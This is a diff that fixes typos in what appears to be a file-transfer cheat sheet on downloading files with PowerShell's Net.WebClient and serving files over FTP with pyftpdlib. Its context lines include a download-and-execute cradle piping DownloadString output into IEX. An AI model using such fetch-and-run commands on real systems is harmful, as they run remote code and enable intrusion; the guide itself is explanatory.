@@ -9,7 +9,7 @@ date: 2024-07-30
 
 ## Download Files using Powershell
 
-The esiast way to download files using Powershell is to use the `Net.WebClient` class. This class provides a intuitive way to download HTTP HTTPS and FTP files.
+The easiest way to download files using Powershell is to use the `Net.WebClient` class. This class provides a intuitive way to download HTTP HTTPS and FTP files.
 
 ```powershell
 $webClient = New-Object System.Net.WebClient
@@ -45,7 +45,7 @@ $webClient.DownloadString("http://example.com/file.txt") | IEX
 
 ### Server
 
-We can start a FTP server on a linux and window machine using the following command, just make sure to have the `pyftpdlib` package installed using pip or any other package manager:
+We can start a FTP server on Linux and window machine using the following command, just make sure to have the `pyftpdlib` package installed using pip or any other package manager:
 
 ```bash
 sudo python3 -m pyftpdlib -i <IP> -p 21
